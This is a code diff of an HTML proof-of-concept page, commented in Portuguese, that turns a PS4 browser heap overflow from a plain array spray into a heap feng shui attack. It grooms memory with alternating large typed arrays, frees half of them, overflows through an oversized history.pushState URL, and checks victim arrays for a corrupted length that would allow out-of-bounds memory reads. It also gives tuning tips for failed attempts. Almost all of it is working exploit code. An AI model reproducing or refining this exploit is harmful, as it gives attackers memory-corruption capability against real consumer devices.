@@ -1,32 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Heap Corruption PoC</title>
+    <title>PS4 Heap Feng Shui</title>
     <style>
-        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
+        body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; }
         button { 
             font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
-            width: 90%; border: 2px solid #00ff00; background: #222; color: #fff; font-weight: bold;
+            width: 100%; border: 2px solid #ff00ff; background: #222; color: #fff;
         }
-        #log { margin-top: 20px; border: 1px solid #555; padding: 15px; color: cyan; text-align: left; height: 300px; overflow-y: scroll;}
-        .success { color: #ff00ff; font-weight: bold; font-size: 20px; }
+        #log { border: 1px solid #555; padding: 10px; height: 300px; overflow: auto; color: cyan; }
+        .win { color: #00ff00; font-weight: bold; font-size: 24px; background: #222; }
     </style>
 </head>
 <body>
 
-    <h1>Heap Overflow: Corrupção de Vizinhos</h1>
-    <p>Tentando atropelar Arrays JavaScript com 0x01.</p>
+    <h1>Heap Feng Shui: Ataque ao Metadata</h1>
+    <p>Criando buracos para encaixar o exploit ao lado da vítima.</p>
 
-    <button onclick="runExploit()">DISPARAR EXPLOIT</button>
+    <button onclick="startFengShui()">INICIAR GROOMING & EXPLOIT</button>
 
     <div id="log">Pronto.</div>
 
     <script>
         const BASE_OFFSET = 709522;
-        const OVERFLOW_SIZE = 32000; // O tamanho que sabemos que funciona
-        const SPRAY_COUNT = 50000;   // Quantidade de "vizinhos"
+        // Tamanho aproximado da string total (740KB). 
+        // Vamos criar arrays um pouco maiores para garantir alinhamento.
+        const ARRAY_SIZE = 0x20000; // 131072 elementos de 4 bytes = 524KB (Tente aumentar se falhar)
+        const SPRAY_NUM = 400;      // Menos arrays, mas eles são gigantes
         
-        var memoryBanks = [];
+        var holes = [];
+        var victims = [];
 
         function log(msg) {
             const el = document.getElementById('log');
@@ -34,74 +37,87 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        function runExploit() {
-            log("1. Alocando " + SPRAY_COUNT + " arrays (Spray)...");
-
-            // FASE 1: SPRAY
-            // Criamos milhares de arrays Uint8Array preenchidos com 0x22
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                let arr = new Uint8Array(1024); // Arrays de 1KB
-                arr.fill(0x22); // Preenche com 0x22 (")
-                memoryBanks.push(arr);
-            }
-
-            log("2. Disparando Overflow de 32KB com bytes 0x01...");
+        function startFengShui() {
+            log("1. Alocando memória massiva (Feng Shui)...");
 
             setTimeout(() => {
-                try {
-                    // FASE 2: OVERFLOW
-                    let buffer = "A".repeat(BASE_OFFSET);
-                    // Adiciona 32.000 bytes de 0x01
-                    buffer += "\x01".repeat(OVERFLOW_SIZE);
+                // FASE 1: PREENCHIMENTO CONTÍNUO
+                // Aloca pares: [LIXO] [VÍTIMA] [LIXO] [VÍTIMA]
+                for (let i = 0; i < SPRAY_NUM; i++) {
+                    // Uint32Array usa 4 bytes por elemento.
+                    let arr = new Uint32Array(ARRAY_SIZE); 
+                    arr.fill(0x41414141);
+                    
+                    // Salva referências alternadas
+                    if (i % 2 === 0) {
+                        holes.push(arr);   // Será deletado para virar buraco
+                    } else {
+                        victims.push(arr); // Será a vítima que checaremos
+                    }
+                }
 
-                    // Dispara
+                log("2. Criando buracos (Delete)...");
+                
+                // FASE 2: CRIAR BURACOS
+                // Removemos as referências dos pares pares. O GC vai limpar.
+                holes = null; 
+                
+                // Tentativa rudimentar de forçar Garbage Collection alocando lixo rápido
+                try { new ArrayBuffer(1024 * 1024 * 100); } catch(e){}
+
+                log("3. Disparando Overflow no buraco...");
+
+                setTimeout(() => {
+                    // FASE 3: INJEÇÃO
+                    // A string deve cair num dos buracos deixados
+                    let buffer = "A".repeat(BASE_OFFSET);
+                    // O overflow de bytes seguros (0x01)
+                    buffer += "\x01".repeat(32000); 
+
                     history.pushState({}, "pwn", "/" + buffer);
 
-                    // FASE 3: VERIFICAÇÃO
-                    log("3. Verificando vítimas...");
-                    checkCorruption();
+                    // FASE 4: CHECAGEM
+                    log("4. Verificando cabeçalhos das vítimas...");
+                    checkVictims();
 
-                } catch (e) {
-                    log("Erro crítico: " + e.message);
-                }
-            }, 500);
+                }, 1000); // Delay maior para o GC trabalhar
+            }, 100);
         }
 
-        function checkCorruption() {
-            let corruptedCount = 0;
+        function checkVictims() {
+            let found = false;
+            
+            // O tamanho original esperado
+            const expectedLen = ARRAY_SIZE;
 
-            for (let i = 0; i < memoryBanks.length; i++) {
-                let arr = memoryBanks[i];
-                
-                // Checa o primeiro byte. Deveria ser 0x22 (34).
-                // Se for 0x01 (1), fomos atropelados!
-                if (arr[0] !== 0x22) {
-                    log("<span class='success'>[SUCESSO] Array #" + i + " CORROMPIDO!</span>");
-                    log("Valor esperado: 34 (0x22) | Valor encontrado: " + arr[0]);
-                    corruptedCount++;
-                    
-                    // Mostra os primeiros 10 bytes para confirmar
-                    let preview = "";
-                    for(let k=0; k<10; k++) preview += arr[k] + " ";
-                    log("Dump: " + preview);
-                    
-                    // Para no primeiro sucesso para não travar a UI
-                    if(corruptedCount > 5) break; 
+            for (let i = 0; i < victims.length; i++) {
+                try {
+                    // Se o cabeçalho foi corrompido, o .length mudou!
+                    if (victims[i].length !== expectedLen) {
+                        log("<span class='win'>!!! SUCESSO !!!</span>");
+                        log("Vítima Index: " + i);
+                        log("Tamanho Original: " + expectedLen);
+                        log("Novo Tamanho: " + victims[i].length);
+                        log("Diferença Hex: 0x" + victims[i].length.toString(16));
+                        found = true;
+                        
+                        // Se o tamanho ficou gigante, conseguimos leitura de memória completa!
+                        break; 
+                    }
+                } catch (e) {
+                    // Se der erro ao ler .length, é porque corrompeu o ponteiro do objeto.
+                    // ISSO TAMBÉM É SUCESSO (Crash controlado)
+                    log("<span class='win'>CRASH DETECTADO AO LER ARRAY " + i + "</span>");
+                    found = true;
+                    break;
                 }
             }
 
-            if (corruptedCount === 0) {
-                log("Nenhuma corrupção detectada. O Overflow caiu no vazio ou longe dos arrays.");
-                log("Tente aumentar o SPRAY_COUNT ou reiniciar o console.");
-            } else {
-                document.body.style.backgroundColor = "#220022";
+            if (!found) {
+                log("Falha. Nenhum vizinho afetado. Ajuste o tamanho do ARRAY_SIZE.");
+                log("Dica: Tente mudar ARRAY_SIZE para 0x40000 (1MB) ou 0x10000.");
             }
         }
     </script>
 </body>
 </html>
-
-
-
-
-
